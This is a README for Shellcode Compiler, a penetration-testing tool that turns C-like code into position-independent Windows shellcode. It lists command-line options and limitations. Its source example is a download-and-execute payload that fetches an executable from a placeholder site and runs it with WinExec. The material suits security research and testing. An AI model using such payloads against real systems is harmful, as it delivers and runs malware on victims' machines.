# Shellcode Compiler
--------------------

Shellcode Compiler is a program that compiles C/C++ style code into a small, position-independent and NULL-free shellcode for Windows. It is possible to call any Windows API function in a user-friendly way.

Shellcode Compiler takes as input a source file and it uses it's own compiler to interpret the code and generate an assembly file which is assembled with NASM (http://www.nasm.us/). 

Shellcode compiler was released at DefCamp security conference in Romania, November 2016.

# Command line options
----------------------
        -h (--help)      : Show this help message
        -v (--verbose)   : Print detailed output
        -t (--test)      : Test (execute) generated shellcode
        -r (--read)      : Read source code file
        -o (--output)    : Output file of the generated binary shellcode
        -a (--assembbly) : Output file of the generated assembly code

# Source code example
---------------------

        function URLDownloadToFileA("urlmon.dll");
        function WinExec("kernel32.dll");
        function ExitProcess("kernel32.dll");

        URLDownloadToFileA(0,"https://site.com/bk.exe","bk.exe",0,0);
        WinExec("bk.exe",0);
        ExitProcess(0);
        
# Invocation example
--------------------
        ShellcodeCompiler.exe -r Source.txt -o Shellcode.bin -a Assembly.asm
        
# Limitations
-------------
1. It is not possible to use the return value of an API call
2. It is not possible to use pointers or buffers
3. It is not possible to declare variables
4. It is not possible to output hex strings

All these limitations will be fixed as soon as possible. However, many other limitations will exist.
This is an Alpha version. Please report any bugs or suggestions.

# Author
--------

Ionut Popescu (@NytroRST) is working as a Senior Penetration Tester for SecureWorks (www.secureworks.com).
